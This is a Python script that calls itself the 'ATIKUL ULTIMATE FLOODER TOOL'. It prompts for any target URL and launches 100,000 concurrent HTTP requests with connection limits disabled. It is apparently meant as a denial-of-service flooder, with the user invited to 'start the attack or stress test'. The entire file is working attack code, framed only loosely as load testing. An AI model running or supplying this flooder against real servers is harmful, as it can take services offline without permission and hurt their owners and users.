import asyncio
import sys
import time
import aiohttp

# Premium terminal color codes
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'


async def send_request(session, target_url, req_id):
  try:
    # Tight timeout, checks response as soon as the server responds
    async with session.get(target_url, timeout=5) as response:
      if response.status == 200:
        print(
            f'{GREEN}[{req_id}] 🚀 Success! Status Code:'
            f' {response.status}{RESET}'
        )
      else:
        print(
            f'{YELLOW}[{req_id}] ⚠️ Warning! Status Code:'
            f' {response.status}{RESET}'
        )
  except Exception as e:
    print(
        f'{RED}[{req_id}] ❌ Failed/Timeout! Server down or busy!{RESET}'
    )


async def main():
  # Premium banner
  print(f'{CYAN}{BOLD}')
  print('==================================================')
  print('       🔥 ATIKUL ULTIMATE FLOODER TOOL v2.0 🔥     ')
  print('==================================================')
  print(f'{RESET}')

  # Interactive prompt: Taking target URL input
  target_url = (
      input(
          f'{YELLOW}🎯 Enter target server URL (e.g.,'
          f' GQ ATIKUL): {RESET}'
      )
      .strip()
      .strip('"')
      .strip("'")
  )
  if not target_url:
    target_url = 'http://127.0.0.1:5000'

  total_requests = 100000  # 100k requests

  print(f'\n{CYAN}[*] Target Selected: {target_url}{RESET}')
  print(
      f'{CYAN}[*] Total Requests Configured: {total_requests} (No-Limit'
      f' Tsunami Mode){RESET}\n'
  )

  input(
      f'{GREEN}▶️ Press Enter to start the attack or stress test...{RESET}'
  )
  print(f'\n{CYAN}🔥 Tsunami traffic flooding has started...{RESET}\n')

  conn = aiohttp.TCPConnector(limit=0, force_close=True)
  start_time = time.time()

  async with aiohttp.ClientSession(connector=conn) as session:
    # 100,000 requests generated simultaneously without any semaphore or limit
    tasks = [
        send_request(session, target_url, i + 1) for i in range(total_requests)
    ]
    await asyncio.gather(*tasks)

  end_time = time.time()
  duration = end_time - start_time

  print(f'\n{CYAN}{BOLD}==========================================')
  print(f'✅ Test Completed!')
  print(f'⏱️ Total Time Taken: {duration:.2f} seconds')
  print(
      f'⚡ Average Speed: {total_requests / duration:.2f}'
      f' requests/second'
  )
  print(f'=========================================={RESET}')


if __name__ == '__main__':
  try:
    asyncio.run(main())
  except KeyboardInterrupt:
    print(
        f'\n{RED}[!] Test successfully terminated by the user.{RESET}'
    )